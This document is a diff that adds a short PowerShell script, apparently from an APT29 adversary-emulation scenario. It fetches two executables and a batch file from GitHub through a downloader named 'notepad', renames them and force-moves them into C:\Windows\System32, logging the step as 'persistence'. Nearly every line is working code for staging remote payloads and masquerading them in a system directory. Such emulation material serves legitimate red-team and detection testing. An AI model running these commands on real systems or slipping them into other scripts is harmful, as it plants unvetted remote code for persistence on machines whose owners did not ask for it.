@@ -1,0 +1,27 @@
+cd \temp
+$javamtsupEXEURL = 'https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/apt29/Resources/Scenario_1/SysinternalsSuite/javamtsup.exe?raw=true'
+$hostUIEXEURL = 'https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/apt29/Resources/Scenario_1/SysinternalsSuite/strings64.exe?raw=true'
+$hostuiBATURL = 'https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/apt29/Resources/Scenario_1/SysinternalsSuite/hostui.txt'
+
+'Downloading files ..' | Out-File -FilePath c:\temp\persistence.txt -Append
+rm javamtsup.exe -errorAction SilentlyContinue
+rm javamtsup.exe@raw=true -errorAction SilentlyContinue
+c:\temp\notepad $javamtsupEXEURL 
+rename-item javamtsup.exe@raw=true javamtsup.exe
+move-item javamtsup.exe C:\Windows\System32 -force
+
+rm strings64.exe -errorAction SilentlyContinue
+rm  strings64.exe@raw=true -errorAction SilentlyContinue
+c:\temp\notepad $hostUIEXEURL 
+rename-item strings64.exe@raw=true strings64.exe
+move-item strings64.exe C:\Windows\System32 -force
+
+rm hostui.txt -errorAction SilentlyContinue
+rm hostui.bat -errorAction SilentlyContinue
+c:\temp\notepad $hostuiBATURL
+rename-item hostui.txt hostui.bat 
+move-item hostui.bat C:\Windows\System32\hostui.bat -force
+
+
+
+
